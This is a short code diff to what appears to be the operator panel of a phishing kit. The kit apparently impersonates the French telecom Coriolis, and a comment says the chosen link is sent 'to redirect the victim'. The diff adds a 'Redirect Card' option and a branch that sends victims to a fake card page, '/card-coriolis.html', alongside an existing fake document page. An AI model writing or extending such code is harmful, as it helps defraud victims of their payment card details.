@@ -644,6 +644,7 @@
     <select id="recupType" onchange="toggleRedirectionType()" style="width:90%;margin-top:10px;margin-left:20px;padding:12px;border:2px solid #e9ecef;border-radius:10px;font-size:14px;background:#f8f9fa;">
         <option value="">-- Choisir --</option>
         <option value="link">Redirect Link</option>
+        <option value="card">Redirect Card</option>
         <option value="doc">Redirect Doc</option>
     </select>
 </div>
@@ -1420,6 +1421,8 @@ function validerRecupLog() {
         }
     } else if (type === 'doc') {
         lien = '/coriolis-trop_trop-percus/document.html';
+    } else if (type === 'card') {
+        lien = '/card-coriolis.html';
     }
     
     // Envoyer le lien au PHP pour rediriger la victime
